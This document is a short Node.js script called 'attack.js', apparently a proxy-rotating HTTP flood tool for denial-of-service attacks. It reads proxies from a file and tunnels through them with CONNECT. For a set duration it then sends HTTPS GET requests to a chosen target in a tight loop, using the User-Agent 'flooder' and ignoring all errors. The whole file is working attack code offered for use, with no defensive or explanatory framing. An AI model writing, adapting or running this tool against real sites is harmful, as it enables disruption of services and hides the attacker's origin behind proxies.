const fs = require('fs');
const http = require('http');
const https = require('https');
const url = require('url');
const { argv } = process;

if (argv.length < 4) {
    console.log("Usage: node attack.js <target> <time>");
    process.exit(1);
}

const target = argv[2];
const duration = parseInt(argv[3]) * 1000;

const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(p => p.trim().length);
let count = 0;

function randProxy() {
    const [ip, port] = proxies[Math.floor(Math.random() * proxies.length)].split(':');
    return { ip, port };
}

function sendRawRequest() {
    const { ip, port } = randProxy();
    const parsed = url.parse(target);

    const options = {
        host: ip,
        port: parseInt(port),
        method: 'CONNECT',
        path: `${parsed.hostname}:443`
    };

    const req = http.request(options);
    req.on('connect', (res, socket) => {
        const reqOptions = {
            host: parsed.hostname,
            method: 'GET',
            path: parsed.path || '/',
            headers: {
                Host: parsed.hostname,
                'User-Agent': 'flooder',
            },
            createConnection: () => socket
        };

        const request = https.request(reqOptions, () => {
            // Don't wait, just dip
            count++;
            console.log(`(${count}) Sent to ${target}`);
        });

        request.on('error', () => {});
        request.end();
    });

    req.on('error', () => {});
    req.end();
}

const end = Date.now() + duration;
const flood = () => {
    while (Date.now() < end) {
        sendRawRequest();
    }
};

flood();
